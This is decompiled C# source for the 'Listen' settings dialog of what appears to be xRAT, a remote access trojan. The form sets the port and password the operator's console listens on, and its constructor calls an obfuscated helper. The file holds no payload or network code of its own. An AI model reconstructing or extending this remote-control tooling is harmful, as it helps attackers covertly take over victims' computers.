namespace xRAT
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class FrmListen : Form
    {
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("Button2")]
        private Button _Button2;
        [AccessedThroughProperty("CheckBox1")]
        private CheckBox _CheckBox1;
        [AccessedThroughProperty("Label1")]
        private Label _Label1;
        [AccessedThroughProperty("Label2")]
        private Label _Label2;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("TextBox2")]
        private TextBox _TextBox2;
        private IContainer icontainer_0;

        public FrmListen()
        {
            Class1.QaIGh5M7cuigS();
            base.Load += new EventHandler(this.FrmListen_Load);
            this.InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (!Class2.Class4_0.method_6().listening)
            {
                if ((this.TextBox1.Text != null) & (this.TextBox2.Text != null))
                {
                    if (Conversions.ToDouble(this.TextBox1.Text) > 60000.0)
                    {
                        Interaction.MsgBox("Port must be under 60000!", MsgBoxStyle.Information, null);
                    }
                    else
                    {
                        Class2.Class4_0.method_6().port = Conversions.ToInteger(this.TextBox1.Text);
                        Class2.Class4_0.method_6().password = this.TextBox2.Text;
                        this.Close();
                        try
                        {
                        }
                        catch (Exception exception1)
                        {
                            ProjectData.SetProjectError(exception1);
                            Interaction.MsgBox("Access denied for path:\r\n" + Application.StartupPath, MsgBoxStyle.Exclamation, null);
                            ProjectData.ClearProjectError();
                        }
                    }
                }
            }
            else
            {
                Interaction.MsgBox("Please stop listening first!", MsgBoxStyle.Exclamation, null);
                this.Close();
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            if (!Class2.Class4_0.method_6().listening)
            {
                if ((this.TextBox1.Text != null) & (this.TextBox2.Text != null))
                {
                    if (Conversions.ToDouble(this.TextBox1.Text) > 60000.0)
                    {
                        Interaction.MsgBox("Please use a Port under 60000!", MsgBoxStyle.Information, null);
                    }
                    else
                    {
                        Class2.Class4_0.method_6().port = Conversions.ToInteger(this.TextBox1.Text);
                        Class2.Class4_0.method_6().password = this.TextBox2.Text;
                        Class2.Class4_0.method_6().ListenToolStripMenuItem.PerformClick();
                        this.Close();
                        try
                        {
                        }
                        catch (Exception exception1)
                        {
                            ProjectData.SetProjectError(exception1);
                            Interaction.MsgBox("Access denied for path:\r\n" + Application.StartupPath, MsgBoxStyle.Exclamation, null);
                            ProjectData.ClearProjectError();
                        }
                    }
                }
            }
            else
            {
                Interaction.MsgBox("Please stop listening first!", MsgBoxStyle.Exclamation, null);
                this.Close();
            }
        }

        private void CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (this.CheckBox1.Checked)
            {
                this.TextBox2.PasswordChar = '\0';
            }
            else
            {
                this.TextBox2.PasswordChar = '●';
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void FrmListen_Load(object sender, EventArgs e)
        {
            this.TextBox2.PasswordChar = '●';
            this.TextBox1.Text = Conversions.ToString(Class2.Class4_0.method_6().port);
            this.TextBox2.Text = Class2.Class4_0.method_6().password;
            if (!Class2.Class4_0.method_6().enable)
            {
                this.TextBox1.Enabled = false;
                this.TextBox2.Enabled = false;
            }
            else if (Class2.Class4_0.method_6().enable)
            {
                this.TextBox1.Enabled = true;
                this.TextBox2.Enabled = true;
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(FrmListen));
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.TextBox1 = new TextBox();
            this.TextBox2 = new TextBox();
            this.Button1 = new Button();
            this.CheckBox1 = new CheckBox();
            this.Button2 = new Button();
            this.SuspendLayout();
            this.Label1.AutoSize = true;
            Point point = new Point(12, 9);
            this.Label1.Location = point;
            this.Label1.Name = "Label1";
            Size size = new Size(0x1f, 13);
            this.Label1.Size = size;
            this.Label1.TabIndex = 0;
            this.Label1.Text = "Port:";
            this.Label2.AutoSize = true;
            point = new Point(12, 0x22);
            this.Label2.Location = point;
            this.Label2.Name = "Label2";
            size = new Size(0x39, 13);
            this.Label2.Size = size;
            this.Label2.TabIndex = 1;
            this.Label2.Text = "Password:";
            point = new Point(0x4a, 6);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            size = new Size(0x91, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 2;
            point = new Point(0x4a, 0x1f);
            this.TextBox2.Location = point;
            this.TextBox2.Name = "TextBox2";
            size = new Size(0x91, 0x15);
            this.TextBox2.Size = size;
            this.TextBox2.TabIndex = 3;
            point = new Point(12, 80);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            size = new Size(0x4b, 0x17);
            this.Button1.Size = size;
            this.Button1.TabIndex = 4;
            this.Button1.Text = "Save";
            this.Button1.UseVisualStyleBackColor = true;
            this.CheckBox1.AutoSize = true;
            point = new Point(0x75, 0x39);
            this.CheckBox1.Location = point;
            this.CheckBox1.Name = "CheckBox1";
            size = new Size(0x65, 0x11);
            this.CheckBox1.Size = size;
            this.CheckBox1.TabIndex = 8;
            this.CheckBox1.Text = "Show Password";
            this.CheckBox1.UseVisualStyleBackColor = true;
            point = new Point(0x5d, 80);
            this.Button2.Location = point;
            this.Button2.Name = "Button2";
            size = new Size(0x7e, 0x17);
            this.Button2.Size = size;
            this.Button2.TabIndex = 9;
            this.Button2.Text = "Save and Listen";
            this.Button2.UseVisualStyleBackColor = true;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(0xe4, 0x73);
            this.ClientSize = size;
            this.Controls.Add(this.Button2);
            this.Controls.Add(this.CheckBox1);
            this.Controls.Add(this.Button1);
            this.Controls.Add(this.TextBox2);
            this.Controls.Add(this.TextBox1);
            this.Controls.Add(this.Label2);
            this.Controls.Add(this.Label1);
            this.FormBorderStyle = FormBorderStyle.Fixed3D;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "FrmListen";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Listen";
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        private void TextBox1_KeyPress(object sender, KeyPressEventArgs e)
        {
            int num = Strings.Asc(e.KeyChar);
            if (((num < 0x30) || (num > 0x39)) && (num != 8))
            {
                e.Handled = true;
            }
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual Button Button2
        {
            get
            {
                return this._Button2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button2_Click);
                if (this._Button2 != null)
                {
                    this._Button2.Click -= handler;
                }
                this._Button2 = value;
                if (this._Button2 != null)
                {
                    this._Button2.Click += handler;
                }
            }
        }

        internal virtual CheckBox CheckBox1
        {
            get
            {
                return this._CheckBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.CheckBox1_CheckedChanged);
                if (this._CheckBox1 != null)
                {
                    this._CheckBox1.CheckedChanged -= handler;
                }
                this._CheckBox1 = value;
                if (this._CheckBox1 != null)
                {
                    this._CheckBox1.CheckedChanged += handler;
                }
            }
        }

        internal virtual Label Label1
        {
            get
            {
                return this._Label1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label1 = value;
            }
        }

        internal virtual Label Label2
        {
            get
            {
                return this._Label2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._Label2 = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                KeyPressEventHandler handler = new KeyPressEventHandler(this.TextBox1_KeyPress);
                if (this._TextBox1 != null)
                {
                    this._TextBox1.KeyPress -= handler;
                }
                this._TextBox1 = value;
                if (this._TextBox1 != null)
                {
                    this._TextBox1.KeyPress += handler;
                }
            }
        }

        internal virtual TextBox TextBox2
        {
            get
            {
                return this._TextBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox2 = value;
            }
        }
    }
}

